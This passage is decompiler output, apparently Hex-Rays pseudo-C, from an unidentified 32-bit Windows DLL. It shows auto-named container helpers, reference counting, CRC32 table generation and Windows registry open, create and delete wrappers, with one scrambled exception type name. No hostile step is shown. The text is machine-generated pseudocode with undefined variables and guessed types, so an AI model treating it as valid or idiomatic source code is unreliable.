  char *result; // eax
  char *v3; // esi

  result = a2;
  if ( this[2] < (unsigned int)a2 )
  {
    v3 = (char *)this[3];
    result = (char *)(*(int (__thiscall **)(_DWORD *, _DWORD, char *, char *))(*this + 84))(this, this[1], v3, a2);
    if ( v3 )
      return sub_10007F50(v3);
  }
  return result;
}

//----- (10018956) --------------------------------------------------------
int __thiscall sub_10018956(int *this)
{
  char *v2; // eax
  int v3; // edx
  int result; // eax

  v2 = (char *)this[3];
  if ( v2 )
    sub_10007F50(v2);
  v3 = *this;
  this[2] = 1;
  result = (*(int (__thiscall **)(int *, _DWORD, _DWORD, int))(v3 + 84))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (1001897D) --------------------------------------------------------
int __thiscall sub_1001897D(_DWORD *this, unsigned int a2)
{
  unsigned int i; // ebx
  int v4; // eax

  for ( i = a2; i < (*(int (**)(void))(*this + 4))(); ++i )
    sub_1003098B((_DWORD *)(this[3] + 8 * i), dword_10193B84);
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v4 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v4 + 88))(this);
}
// 10193B84: using guessed type _DWORD dword_10193B84[2];

//----- (100189C2) --------------------------------------------------------
unsigned int __thiscall sub_100189C2(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1013EB1B);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 60))(a4, this[1] - a2);
  v5 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 36))(a4, this[3] + 8 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 36))(a3, this[3] + 8 * v5);
      ++v5;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (10018A34) --------------------------------------------------------
unsigned int __thiscall sub_10018A34(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // edi
  int v6; // ecx
  int *v7; // eax
  _DWORD *v8; // ebx
  int v9; // eax
  unsigned int v10; // ebx
  unsigned int result; // eax

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 80))(this, this[2], a4);
  this[2] = v5;
  v6 = (unsigned __int64)(unsigned int)v5 >> 29 != 0 ? -1 : 8 * v5;
  v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
  v8 = 0;
  if ( v7 )
  {
    v8 = v7 + 1;
    *v7 = v5;
    `eh vector constructor iterator'(v7 + 1, 8u, v5, (void (__thiscall *)(void *))sub_10018FAC, sub_1000780D);
  }
  this[1] = a2;
  v9 = *this;
  this[3] = v8;
  v10 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(v9 + 4))(this);
  if ( result )
  {
    do
    {
      sub_1003098B((_DWORD *)(8 * v10 + this[3]), (_DWORD *)(8 * v10 + a3));
      ++v10;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v10 < result );
  }
  return result;
}

//----- (10018AE4) --------------------------------------------------------
void *__thiscall sub_10018AE4(_DWORD *this)
{
  void *result; // eax
  int v3; // edi
  int v4; // eax
  int v5; // edi
  int v6; // eax
  int v7; // ecx
  int *v8; // eax
  _DWORD *v9; // edi
  _DWORD *v10; // ebx
  char *i; // eax
  char *v12; // [esp+Ch] [ebp-1Ch]
  int v13; // [esp+10h] [ebp-18h]
  _DWORD *v14; // [esp+14h] [ebp-14h]
  unsigned int v15; // [esp+18h] [ebp-10h]

  result = &loc_100A2372;
  if ( this[2] > 0x10u )
  {
    result = (void *)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this));
    if ( (unsigned int)result <= this[2] )
    {
      v3 = *this;
      v4 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v3 + 80))(this, 1, v4) <= 0x10 )
      {
        v13 = 16;
      }
      else
      {
        v5 = *this;
        v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
        v13 = (*(int (__thiscall **)(_DWORD *, int, int))(v5 + 80))(this, 1, v6);
      }
      v12 = (char *)this[3];
      v7 = (unsigned __int64)(unsigned int)v13 >> 29 != 0 ? -1 : 8 * v13;
      v8 = (int *)operator new(__CFADD__(v7, 4) ? -1 : v7 + 4);
      if ( v8 )
      {
        v9 = v8 + 1;
        *v8 = v13;
        `eh vector constructor iterator'(v8 + 1, 8u, v13, (void (__thiscall *)(void *))sub_10018FAC, sub_1000780D);
        v14 = v9;
      }
      else
      {
        v14 = 0;
      }
      v15 = 0;
      if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
      {
        v10 = v14;
        for ( i = (char *)(v12 - (char *)v14); ; i = (char *)(v12 - (char *)v14) )
        {
          sub_1003098B(v10, (_DWORD *)((char *)v10 + (_DWORD)i));
          ++v15;
          v10 += 2;
          if ( v15 >= (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
            break;
        }
      }
      this[3] = v14;
      if ( v12 )
        sub_10007F50(v12);
      result = (void *)v13;
      this[2] = v13;
    }
  }
  return result;
}

//----- (10018BFA) --------------------------------------------------------
_DWORD *__stdcall sub_10018BFA(_DWORD *a1)
{
  int v1; // eax

  *a1 = off_100FBF5C;
  *a1 = &off_10102970;
  sub_10018FD5(a1 + 1, 1u);
  a1[5] = off_100FBF5C;
  a1[5] = &off_101029B0;
  v1 = sub_1001411E(1u, 1u);
  sub_10019125(a1 + 5, v1);
  return a1;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10102970: using guessed type int (__thiscall *off_10102970)(void *Block, char);
// 101029B0: using guessed type int (__thiscall *off_101029B0)(void *Block, char);

//----- (10018C67) --------------------------------------------------------
void *__thiscall sub_10018C67(_DWORD *this)
{
  *this = &off_10102970;
  sub_1001878F(this + 5);
  sub_100068A5(this + 1);
  return sub_100185A9(this);
}
// 10102970: using guessed type int (__thiscall *off_10102970)(void *Block, char);

//----- (10018CB1) --------------------------------------------------------
bool __thiscall sub_10018CB1(_DWORD *this, int a2)
{
  int v3; // esi
  int v4; // eax
  bool result; // al

  v3 = sub_1001901E(this, a2);
  result = 0;
  if ( v3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    v4 = (*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v3);
    if ( !sub_1000D65C(a2, v4) )
      return 1;
  }
  return result;
}

//----- (10018CF0) --------------------------------------------------------
char __thiscall sub_10018CF0(_DWORD *this, int a2)
{
  int v3; // ebx
  int v4; // eax

  v3 = sub_1001901E(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    return 0;
  v4 = (*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3);
  if ( sub_1000D65C(a2, v4) )
    return 0;
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 40))(this + 1, v3);
  (*(void (__thiscall **)(_DWORD *, int))(this[5] + 40))(this + 5, v3);
  return 1;
}

//----- (10018D44) --------------------------------------------------------
int __thiscall sub_10018D44(_DWORD *this, int a2)
{
  int v3; // ebx
  int v4; // eax
  _DWORD *v5; // eax
  _DWORD v7[2]; // [esp+8h] [ebp-14h] BYREF
  int v8; // [esp+18h] [ebp-4h]

  v3 = sub_1001901E(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || (v4 = (*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3), sub_1000D65C(a2, v4)) )
  {
    (*(void (__thiscall **)(_DWORD *, int, int))(this[1] + 32))(this + 1, a2, v3);
    v5 = sub_100077CD(v7);
    v8 = 0;
    (*(void (__thiscall **)(_DWORD *, _DWORD *, int))(this[5] + 32))(this + 5, v5, v3);
    v8 = -1;
    sub_1000780D(v7);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 44))(this + 5, v3);
}
// 10018D44: using guessed type _DWORD var_14[2];

//----- (10018DC8) --------------------------------------------------------
int __thiscall sub_10018DC8(_DWORD *this, int a2)
{
  int v3; // esi
  int v4; // eax
  _DWORD *v6; // eax

  v3 = sub_1001901E(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || (v4 = (*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v3), sub_1000D65C(a2, v4)) )
  {
    v6 = sub_1000E8EF(&a2);
    sub_100078FE((int)v6);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 48))(this + 5, v3);
}

//----- (10018E34) --------------------------------------------------------
void __thiscall sub_10018E34(void *this, int a2, int *a3)
{
  _DWORD *v4; // eax
  int v5; // [esp+8h] [ebp-14h] BYREF
  volatile LONG *v6; // [esp+Ch] [ebp-10h]
  int v7; // [esp+18h] [ebp-4h]

  v6 = (volatile LONG *)a3[1];
  v5 = *a3;
  InterlockedIncrement(v6);
  v7 = 0;
  v4 = (_DWORD *)(*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 16))(this, a2);
  sub_1003098B(v4, &v5);
  v7 = -1;
  sub_1000780D(&v5);
}

//----- (10018E8A) --------------------------------------------------------
_DWORD *__thiscall sub_10018E8A(_DWORD *this, _DWORD *a2)
{
  sub_1000809E(this + 1, a2);
  return a2;
}

//----- (10018EC2) --------------------------------------------------------
_DWORD *__thiscall sub_10018EC2(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // esi
  int v3; // eax
  int v5; // [esp-8h] [ebp-24h]
  int v6; // [esp-4h] [ebp-20h]

  v2 = this + 5;
  *a2 = off_100FBF5C;
  *a2 = &off_101029B0;
  a2[2] = 1;
  v6 = (*(int (__thiscall **)(_DWORD *))(this[5] + 4))(this + 5);
  v5 = v2[3];
  v3 = (*(int (__thiscall **)(_DWORD *))(*v2 + 4))(v2);
  sub_10018A34(a2, v3, v5, v6);
  return a2;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 101029B0: using guessed type int (__thiscall *off_101029B0)(void *Block, char);

//----- (10018F27) --------------------------------------------------------
_DWORD *__thiscall sub_10018F27(int *this, _DWORD *a2)
{
  sub_100190A5(this, a2);
  return a2;
}

//----- (10018F5A) --------------------------------------------------------
_DWORD *__thiscall sub_10018F5A(int *this, _DWORD *a2)
{
  sub_100190E5(this, a2);
  return a2;
}

//----- (10018F8D) --------------------------------------------------------
_DWORD *__thiscall sub_10018F8D(_DWORD *Block, char a2)
{
  sub_1001878F(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10018FAC) --------------------------------------------------------
void __thiscall sub_10018FAC(_DWORD *this)
{
  sub_100077CD(this);
}

//----- (10018FB6) --------------------------------------------------------
_DWORD *__thiscall sub_10018FB6(_DWORD *Block, char a2)
{
  sub_10018C67(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10018FD5) --------------------------------------------------------
_DWORD *__stdcall sub_10018FD5(_DWORD *a1, unsigned int a2)
{
  unsigned int v2; // esi

  sub_1000A901(a1);
  v2 = 1;
  for ( *a1 = &off_100FBF60; v2 < a2; v2 *= 2 )
    ;
  sub_100080F2(a1, v2);
  return a1;
}
// 100FBF60: using guessed type int (__thiscall *off_100FBF60)(void *Block, char);

//----- (1001901E) --------------------------------------------------------
int __userpurge sub_1001901E@<eax>(_DWORD *a1@<edi>, int a2)
{
  int v2; // esi
  int v3; // eax
  int v4; // eax
  int v5; // eax
  int v7; // [esp+4h] [ebp-8h]
  int v8; // [esp+8h] [ebp-4h]

  v8 = -1;
  v2 = (unsigned int)(*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1) >> 1;
  v7 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  if ( v2 > -1 )
  {
    do
    {
      if ( v2 >= v7 )
        break;
      v3 = (*(int (__thiscall **)(_DWORD *, int))(a1[1] + 48))(a1 + 1, v2);
      if ( !sub_1000D65C(v3, a2) )
        break;
      v4 = (*(int (__thiscall **)(_DWORD *, int))(a1[1] + 48))(a1 + 1, v2);
      if ( sub_1000D64D(v4, a2) )
      {
        v7 = v2;
        v5 = v2 + v8;
      }
      else
      {
        v8 = v2;
        v5 = v7 + v2 + 1;
      }
      v2 = v5 / 2;
    }
    while ( v5 / 2 > v8 );
  }
  if ( v2 == v8 )
    return v8 + 1;
  return v2;
}

//----- (100190A5) --------------------------------------------------------
_DWORD *__thiscall sub_100190A5(int *this, _DWORD *a2)
{
  volatile LONG *v2; // eax
  int v3; // ecx

  v2 = (volatile LONG *)this[1];
  v3 = *this;
  a2[1] = v2;
  *a2 = v3;
  InterlockedIncrement(v2);
  return a2;
}

//----- (100190E5) --------------------------------------------------------
_DWORD *__thiscall sub_100190E5(int *this, _DWORD *a2)
{
  volatile LONG *v2; // eax
  int v3; // ecx

  v2 = (volatile LONG *)this[1];
  v3 = *this;
  a2[1] = v2;
  *a2 = v3;
  InterlockedIncrement(v2);
  return a2;
}

//----- (10019125) --------------------------------------------------------
void __usercall sub_10019125(_DWORD *a1@<edi>, int a2@<esi>)
{
  _DWORD *v2; // ebx
  int v3; // ecx
  int *v4; // eax

  v2 = 0;
  a1[1] = 0;
  a1[2] = a2;
  v3 = (unsigned __int64)(unsigned int)a2 >> 29 != 0 ? -1 : 8 * a2;
  v4 = (int *)operator new(__CFADD__(v3, 4) ? -1 : v3 + 4);
  if ( v4 )
  {
    v2 = v4 + 1;
    *v4 = a2;
    `eh vector constructor iterator'(v4 + 1, 8u, a2, (void (__thiscall *)(void *))sub_10018FAC, sub_1000780D);
  }
  a1[3] = v2;
}

//----- (10019192) --------------------------------------------------------
_DWORD *__stdcall sub_10019192(_DWORD *a1, void *a2, int a3)
{
  sub_1000B1F3(0, (int)(a1 + 1), 0);
  a1[7] = a3;
  sub_10019215(a2, a1);
  return a1;
}

//----- (100191D6) --------------------------------------------------------
_DWORD *__userpurge sub_100191D6@<eax>(_DWORD *a1@<ebx>, _DWORD *a2, int a3)
{
  int v3; // eax

  *a2 = a3;
  sub_1000B36F(a1, (int)(a2 + 1));
  v3 = a2[4];
  a2[7] = 0;
  a2[6] = v3;
  return a2;
}

//----- (10019215) --------------------------------------------------------
void *__thiscall sub_10019215(void *this, _DWORD *a2)
{
  unsigned __int8 v3; // al
  void *v4; // eax
  LONG *v5; // eax
  _DWORD *v6; // edi
  int v7; // eax
  int v8; // ecx
  LONG *v9; // eax
  int v10; // esi
  _DWORD *v11; // eax
  int v13; // [esp+0h] [ebp-7Ch] BYREF
  int v14[9]; // [esp+10h] [ebp-6Ch] BYREF
  _DWORD v15[7]; // [esp+34h] [ebp-48h] BYREF
  int v16[5]; // [esp+50h] [ebp-2Ch] BYREF
  _DWORD v17[3]; // [esp+64h] [ebp-18h] BYREF
  int v18; // [esp+78h] [ebp-4h]

  v17[2] = &v13;
  v18 = 0;
  (*(void (__thiscall **)(void *, _DWORD, _DWORD))(*(_DWORD *)this + 8))(this, a2[7], 0);
  sub_1002079F(this, v15);
  LOBYTE(v18) = 1;
  sub_1001B0CD(v15, v14);
  LOBYTE(v18) = 2;
  v3 = sub_1001B198((int)v14);
  *a2 = v3;
  if ( v3 == 12 )
  {
    v4 = (void *)sub_1001B208(v14);
    v5 = (LONG *)sub_1000B1F3(v4, (int)v16, 0);
    LOBYTE(v18) = 3;
    sub_1000B3BD(v5, (int)(a2 + 1));
    LOBYTE(v18) = 2;
    sub_1000B3DF(v16);
    v6 = a2;
    a2[6] = a2[4];
    v7 = sub_1001B208(v14);
    sub_1000B713(v8, a2 + 1, 0, v7);
  }
  else
  {
    v9 = sub_1001B341(v14, v16, 1);
    LOBYTE(v18) = 4;
    sub_1000B3BD(v9, (int)(a2 + 1));
    LOBYTE(v18) = 2;
    sub_1000B3DF(v16);
    a2[6] = a2[4];
    v6 = a2;
  }
  v10 = v15[6];
  if ( v10 != sub_1001B208(v14) )
  {
    v11 = sub_10016E5C(v17);
    LOBYTE(v18) = 5;
    sub_100171B9((int)v11, 155);
  }
  if ( *v6 == 1 )
    *v6 = 12;
  LOBYTE(v18) = 1;
  sub_1001B131((int)v14);
  LOBYTE(v18) = 0;
  return sub_100207FD(v15);
}
// 100192AE: variable 'v8' is possibly undefined
// 10019215: using guessed type int var_6C[9];
// 10019215: using guessed type int var_2C[5];

//----- (1001936C) --------------------------------------------------------
int __usercall sub_1001936C@<eax>(void *a1@<ecx>, _DWORD *a2@<edi>)
{
  char v3; // al
  int v5[7]; // [esp-14h] [ebp-6Ch] BYREF
  _DWORD v6[9]; // [esp+8h] [ebp-50h] BYREF
  int v7[4]; // [esp+2Ch] [ebp-2Ch] BYREF
  char v8[12]; // [esp+3Ch] [ebp-1Ch] BYREF
  void *v9; // [esp+48h] [ebp-10h]
  int v10; // [esp+54h] [ebp-4h]

  (*(void (__thiscall **)(void *, _DWORD, _DWORD))(*(_DWORD *)a1 + 8))(a1, a2[7], 0);
  a2[6] = a2[4];
  sub_1002033C(a1, (int)v7, 0);
  v10 = 0;
  v7[0] = (int)&off_10102E30;
  sub_10019445((int)v8);
  v10 = 1;
  sub_1001A969(v7, v6, 1);
  LOBYTE(v10) = 2;
  sub_1001AA35(v6, *(unsigned __int8 *)a2);
  if ( *a2 == 12 )
  {
    sub_1001AA80(v6, a2[4]);
    v3 = sub_1000B6F2(a2 + 1, 0);
    sub_1001AA80(v6, v3);
  }
  else
  {
    v9 = v5;
    sub_1000B36F(a2 + 1, (int)v5);
    LOBYTE(v10) = 2;
    sub_1001AB12(v6, v5[0], v5[1], v5[2], v5[3], v5[4]);
  }
  sub_1001AA80(v6, v8[8]);
  LOBYTE(v10) = 1;
  sub_1001A9CE((int)v6);
  v10 = -1;
  return sub_10020918(v7);
}
// 10102E30: using guessed type int (__thiscall *off_10102E30)(void *Block, char);
// 1001936C: using guessed type _DWORD var_50[9];

//----- (10019445) --------------------------------------------------------
int __usercall sub_10019445@<eax>(int a1@<esi>)
{
  int v1; // eax

  sub_10019506();
  v1 = dword_1017DF20;
  *(_DWORD *)(a1 + 8) = 0;
  *(_DWORD *)(a1 + 4) = v1;
  return a1;
}
// 1017DF20: using guessed type int dword_1017DF20;

//----- (10019459) --------------------------------------------------------
int __usercall sub_10019459@<eax>(_DWORD *a1@<ecx>, int a2@<esi>)
{
  unsigned int v2; // edi
  int v3; // ecx
  int v4; // eax
  int v5; // edx
  int result; // eax
  int v7; // [esp+4h] [ebp-4h]

  *(_DWORD *)(a2 + 8) = ~*(_DWORD *)(a2 + 8);
  v2 = 0;
  v7 = sub_1000B4B8(a1);
  if ( *(_DWORD *)(v3 + 12) )
  {
    v4 = *(_DWORD *)(a2 + 4);
    do
    {
      v5 = *(_DWORD *)(v4 + 4 * (unsigned __int8)(*(_DWORD *)(a2 + 8) ^ *(_BYTE *)(v2 + v7))) ^ (*(_DWORD *)(a2 + 8) >> 8);
      ++v2;
      *(_DWORD *)(a2 + 8) = v5;
    }
    while ( v2 < *(_DWORD *)(v3 + 12) );
  }
  result = ~*(_DWORD *)(a2 + 8);
  *(_DWORD *)(a2 + 8) = result;
  return result;
}
// 10019468: variable 'v3' is possibly undefined

//----- (100194A1) --------------------------------------------------------
void __thiscall sub_100194A1(void **this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  *this = off_10102A2C;
  v1[6] = 0;
  if ( this[1] )
    j__free(this[1]);
}
// 10102A2C: using guessed type int (__thiscall *off_10102A2C[2])(void *Block, char);

//----- (100194E7) --------------------------------------------------------
void **__thiscall sub_100194E7(void **Block, char a2)
{
  sub_100194A1(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10019506) --------------------------------------------------------
int sub_10019506()
{
  int v0; // ecx
  int result; // eax
  void *v2; // eax
  unsigned int i; // esi
  unsigned int v4; // edx
  int v5; // ecx
  int v6; // ecx
  _DWORD *v7[2]; // [esp+0h] [ebp-18h] BYREF
  void *Block; // [esp+8h] [ebp-10h] BYREF
  int v9; // [esp+14h] [ebp-4h]

  v0 = dword_1017DF20;
  result = _InterlockedExchange((volatile __int32 *)&Block, (__int32)&loc_100A60DB);
  if ( !v0 )
  {
    sub_1000EDE4(dword_10193C18, v7);
    v9 = 0;
    if ( !dword_1017DF20 )
    {
      v2 = operator new(0x400u);
      Block = v2;
      LOBYTE(v9) = 1;
      if ( v2 )
      {
        for ( i = 0; i < 0x100; ++i )
        {
          v4 = i;
          v5 = 8;
          do
          {
            if ( (v4 & 1) != 0 )
              v4 = (v4 >> 1) ^ 0xEDB88320;
            else
              v4 >>= 1;
            --v5;
          }
          while ( v5 );
          *((_DWORD *)v2 + i) = v4;
        }
        v6 = (int)v2;
      }
      else
      {
        v6 = 0;
      }
      LOBYTE(v9) = 0;
      _InterlockedExchange((volatile __int32 *)&Block, (__int32)v2);
      dword_1017DF20 = v6;
      dword_101835F0 = v6;
    }
    v9 = -1;
    return sub_1000EDA4(v7);
  }
  return result;
}
// 1017DF20: using guessed type int dword_1017DF20;
// 101835F0: using guessed type int dword_101835F0;
// 10193C18: using guessed type int dword_10193C18[9];

//----- (100195B0) --------------------------------------------------------
_DWORD *__thiscall sub_100195B0(_DWORD *Block, char a2)
{
  *Block = &off_10102A30;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10102A30: using guessed type int (__thiscall *off_10102A30)(void *Block, char);

//----- (100195D0) --------------------------------------------------------
char __thiscall sub_100195D0(void *this, int a2, char a3)
{
  HKEY v3; // eax
  REGSAM v4; // ecx
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  DWORD dwErrCode; // [esp+Ch] [ebp-34h] BYREF
  HKEY phkResult; // [esp+10h] [ebp-30h] BYREF
  int v10; // [esp+14h] [ebp-2Ch] BYREF
  int v11[2]; // [esp+18h] [ebp-28h] BYREF
  HKEY v12[2]; // [esp+20h] [ebp-20h] BYREF
  _DWORD v13[3]; // [esp+28h] [ebp-18h] BYREF
  int v14; // [esp+3Ch] [ebp-4h]

  dwErrCode = (DWORD)this;
  GetCurrentProcessId();
  GetCurrentProcessId();
  v3 = sub_1001A5CA((HKEY)dwErrCode, a2, a3);
  sub_10011B1D(v12, (int)v3);
  v14 = 0;
  sub_1001A70D(v11, a2);
  LOBYTE(v14) = 1;
  phkResult = 0;
  if ( a3 )
    v4 = 131097;
  else
    v4 = *(_DWORD *)(dwErrCode + 4);
  dwErrCode = RegOpenKeyExW(v12[1], *(LPCWSTR *)(v11[1] + 12), 0, v4, &phkResult);
  GetCurrentProcessId();
  GetCurrentProcessId();
  sub_10011B1D(v13, (int)phkResult);
  LOBYTE(v14) = 2;
  SetLastError(dwErrCode);
  if ( dwErrCode )
  {
    if ( dwErrCode != 2 )
    {
      if ( dwErrCode != 5 )
      {
        v5 = sub_100245AE(&dwErrCode);
        LOBYTE(v14) = 4;
        sub_1001A8EA((int)v5);
      }
      SetLastError(5u);
      v6 = sub_100209F2(&v10);
      LOBYTE(v14) = 3;
      sub_1001A8CA((int)v6);
    }
    LOBYTE(v14) = 1;
    sub_10011DDD(v13);
    LOBYTE(v14) = 0;
    sub_1000D3AD(v11);
    v14 = -1;
    sub_10011DDD(v12);
    return 0;
  }
  else
  {
    LOBYTE(v14) = 1;
    sub_10011DDD(v13);
    LOBYTE(v14) = 0;
    sub_1000D3AD(v11);
    v14 = -1;
    sub_10011DDD(v12);
    return 1;
  }
}
// 100195D0: using guessed type _DWORD var_18[3];

//----- (10019736) --------------------------------------------------------
HKEY __stdcall sub_10019736(HKEY a1, int a2, char a3)
{
  HKEY v3; // eax
  REGSAM v4; // ecx
  DWORD v5; // esi
  _DWORD *v6; // eax
  _DWORD *v7; // eax
  _DWORD *v8; // eax
  HKEY v9; // esi
  HKEY phkResult; // [esp+10h] [ebp-30h] BYREF
  int v12; // [esp+14h] [ebp-2Ch] BYREF
  int v13; // [esp+18h] [ebp-28h] BYREF
  int v14; // [esp+1Ch] [ebp-24h] BYREF
  int v15[2]; // [esp+20h] [ebp-20h] BYREF
  HKEY v16[3]; // [esp+28h] [ebp-18h] BYREF
  int v17; // [esp+3Ch] [ebp-4h]

  GetCurrentProcessId();
  GetCurrentProcessId();
  v3 = sub_1001A5CA(a1, a2, a3);
  sub_10011B1D(v16, (int)v3);
  v17 = 0;
  sub_1001A70D(v15, a2);
  LOBYTE(v17) = 1;
  v4 = 131097;
  if ( !a3 )
    v4 = *((_DWORD *)a1 + 1);
  v5 = RegOpenKeyExW(v16[1], *(LPCWSTR *)(v15[1] + 12), 0, v4, &phkResult);
  SetLastError(v5);
  if ( v5 )
  {
    if ( v5 != 2 )
    {
      if ( v5 != 5 )
      {
        v6 = sub_100245AE(&v12);
        LOBYTE(v17) = 4;
        sub_1001A8EA((int)v6);
      }
      v7 = sub_100209F2(&v13);
      LOBYTE(v17) = 2;
      sub_1001A8CA((int)v7);
    }
    v8 = sub_100209F2(&v14);
    LOBYTE(v17) = 3;
    sub_1001A90A((int)v8);
  }
  v9 = phkResult;
  LOBYTE(v17) = 0;
  sub_1000D3AD(v15);
  v17 = -1;
  sub_10011DDD(v16);
  return v9;
}

//----- (1001984B) --------------------------------------------------------
HKEY __cdecl sub_1001984B(HKEY hKey)
{
  HKEY result; // eax
  DWORD v2; // eax
  _DWORD *v3; // eax

  result = hKey;
  if ( hKey != HKEY_CLASSES_ROOT
    && hKey != HKEY_CURRENT_USER
    && hKey != HKEY_LOCAL_MACHINE
    && hKey != HKEY_USERS
    && hKey != HKEY_PERFORMANCE_DATA
    && hKey != HKEY_CURRENT_CONFIG
    && hKey != HKEY_DYN_DATA )
  {
    v2 = RegCloseKey(hKey);
    SetLastError(v2);
    result = (HKEY)GetLastError();
    if ( result )
    {
      v3 = sub_100245AE(&hKey);
      sub_1001A8EA((int)v3);
    }
  }
  return result;
}

//----- (100198C2) --------------------------------------------------------
void __thiscall sub_100198C2(HKEY phkResult, int a2)
{
  HKEY v3; // eax
  DWORD v4; // edi
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  int (__thiscall **v7)(void *, char); // [esp+8h] [ebp-38h] BYREF
  HKEY phkResulta; // [esp+Ch] [ebp-34h] BYREF
  int pExceptionObject; // [esp+10h] [ebp-30h] BYREF
  int v10[2]; // [esp+14h] [ebp-2Ch] BYREF
  int v11[2]; // [esp+1Ch] [ebp-24h] BYREF
  struct _SECURITY_ATTRIBUTES SecurityAttributes; // [esp+24h] [ebp-1Ch] BYREF
  int v13; // [esp+3Ch] [ebp-4h]

  if ( (*(unsigned __int8 (__thiscall **)(HKEY, int, int))(*(_DWORD *)phkResult + 4))(phkResult, a2, 1) )
  {
    sub_100245AE(&v7);
    v7 = &off_10102888;
    v13 = 1;
    sub_1001E589(&pExceptionObject, (int)&v7);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AVDvyHnthghyKltbjqChpwdvyhn_qsbdzsml_sr__);
  }
  sub_1001A70D(v10, a2);
  v13 = 2;
  GetCurrentProcessId();
  GetCurrentProcessId();
  v3 = sub_1001A5CA(phkResult, a2, 0);
  sub_10011B1D(v11, (int)v3);
  LOBYTE(v13) = 3;
  SecurityAttributes.nLength = 12;
  SecurityAttributes.lpSecurityDescriptor = 0;
  SecurityAttributes.bInheritHandle = 0;
  v4 = RegCreateKeyExW(
         (HKEY)v11[1],
         *(LPCWSTR *)(v10[1] + 12),
         0,
         &Class,
         0,
         0x2001Fu,
         &SecurityAttributes,
         &phkResulta,
         0);
  SetLastError(v4);
  if ( v4 )
  {
    if ( v4 != 5 )
    {
      v5 = sub_100245AE(&pExceptionObject);
      LOBYTE(v13) = 5;
      sub_1001A8EA((int)v5);
    }
    v6 = sub_100209F2(&v7);
    LOBYTE(v13) = 4;
    sub_1001A8CA((int)v6);
  }
  sub_1001984B(phkResulta);
  LOBYTE(v13) = 2;
  sub_10011DDD(v11);
  v13 = -1;
  sub_1000D3AD(v10);
}
// 10102888: using guessed type int (__thiscall *off_10102888)(void *Block, char);

//----- (10019A24) --------------------------------------------------------
char __thiscall sub_10019A24(HKEY phkResult, int a2)
{
  HKEY v3; // eax
  DWORD v4; // esi
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  int v8; // [esp+8h] [ebp-28h] BYREF
  int v9; // [esp+Ch] [ebp-24h] BYREF
  int v10[2]; // [esp+10h] [ebp-20h] BYREF
  HKEY v11[3]; // [esp+18h] [ebp-18h] BYREF
  int v12; // [esp+2Ch] [ebp-4h]

  GetCurrentProcessId();
  GetCurrentProcessId();
  v3 = sub_1001A5CA(phkResult, a2, 0);
  sub_10011B1D(v11, (int)v3);
  v12 = 0;
  sub_1001A70D(v10, a2);
  LOBYTE(v12) = 1;
  v4 = RegDeleteKeyW(v11[1], *(LPCWSTR *)(v10[1] + 12));
  SetLastError(v4);
  if ( v4 )
  {
    if ( v4 != 2 )
    {
      v5 = sub_100245AE(&v8);
      LOBYTE(v12) = 3;
      sub_1001A8EA((int)v5);
    }
    v6 = sub_100209F2(&v9);
    LOBYTE(v12) = 2;
    sub_1001A90A((int)v6);
  }
  LOBYTE(v12) = 0;
  sub_1000D3AD(v10);
  v12 = -1;
  return sub_10011DDD(v11);
}

//----- (10019B05) --------------------------------------------------------
